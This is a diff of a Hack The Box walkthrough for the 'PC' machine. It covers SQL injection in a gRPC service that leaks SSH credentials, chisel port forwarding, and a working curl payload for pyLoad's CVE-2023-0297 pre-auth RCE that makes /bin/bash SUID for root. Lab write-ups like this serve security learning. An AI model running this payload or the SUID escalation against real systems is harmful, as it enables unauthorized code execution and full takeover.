@@ -40,15 +40,25 @@ gRPC Web UI available at http://127.0.0.1:32953/
 ```
 After installing and running the program we are greeted with a page.
 
+Using default credentials works but it does not get us anywhere.
+
 ![image](https://github.com/Rogue-1/HTB/assets/105310322/1798d19a-54b0-47d8-8efa-4114f991063c)
 
 ![image](https://github.com/Rogue-1/HTB/assets/105310322/e08a1923-efe7-4dcc-81f0-d6052dcd9eca)
 
+However in the getinfo section we can see that it may be vulnerable to sql injection based on the errors.
+
 ![image](https://github.com/Rogue-1/HTB/assets/105310322/6a096f4e-55c8-41a7-b58a-7a4ca47692dd)
+
+After alot of messing around we finally get some data back with usernames and passwords to log in through ssh as sau - HereIsYourPassword1431
 
 ![image](https://github.com/Rogue-1/HTB/assets/105310322/ba5b0b95-e080-4f05-8355-b9564cedfe57)
 
 ![image](https://github.com/Rogue-1/HTB/assets/105310322/89b443cb-3cd5-40c0-b7bf-bfb58ec18094)
+
+
+Login and grab the user flag.
+
 ```
 └──╼ [★]$ ssh sau@10.129.94.151
 sau@10.129.94.151's password: 
@@ -60,6 +70,9 @@ sau@pc:~$ cat user.txt
 474dded2f0348a7c9aacbad64cb7e513
 ```
 
+After logging in I ran linpeas and noticed port 8000 was open.
+
+Transfer chisel to the victim and run it to access the webpage on our host computer.
 
 ```
 └──╼ [★]$ chisel server --reverse --port 1234
@@ -72,7 +85,23 @@ sau@pc:/dev/shm$ ./chisel client 10.10.14.31:1234 R:8000:127.0.0.1:8000
 2023/07/11 21:04:15 client: Connecting to ws://10.10.14.31:1234
 ```
 
+We are greeted with a login page for pyload but none of the credentials we have work. Luckily a quick google search for pyload vulnerabilites shows that there is a CVE for it.
+
 ![image](https://github.com/Rogue-1/HTB/assets/105310322/010ff159-666f-4e78-a64d-11f764d553d9)
+
+https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad
+
+Create a simple priv esc bash script
+
+```
+#!/bin/bash
+
+chmod u+s /bin/bash
+```
+
+Modify the payload to access your bash script.
+
+Running the script may appear to fail but if you check it you can see that it was successful.
 
 ```
 └──╼ [★]$ curl -i -s -k -X $'POST'     --data-binary $'jk=pyimport%20os;os.system(\"bash%20/dev/shm/bash.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'     $'http://127.0.0.1:8000/flash/addcrypted2'
@@ -88,11 +117,7 @@ Server: Cheroot/8.6.0
 
 Could not decrypt key
 ```
-```
-#!/bin/bash
 
-chmod u+s /bin/bash
-```
 ```
 sau@pc:/dev/shm$ ./chisel client 10.10.14.31:1234 R:8000:127.0.0.1:8000
 2023/07/11 21:27:21 client: Connecting to ws://10.10.14.31:1234
@@ -103,6 +128,9 @@ sau@pc:/dev/shm$ ls -la /bin/bash
 -rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
 
 ```
+
+After everything works out you can grab the root flag!
+
 ```
 sau@pc:/dev/shm$ bash -p
 bash-5.0# cat /root/root.txt
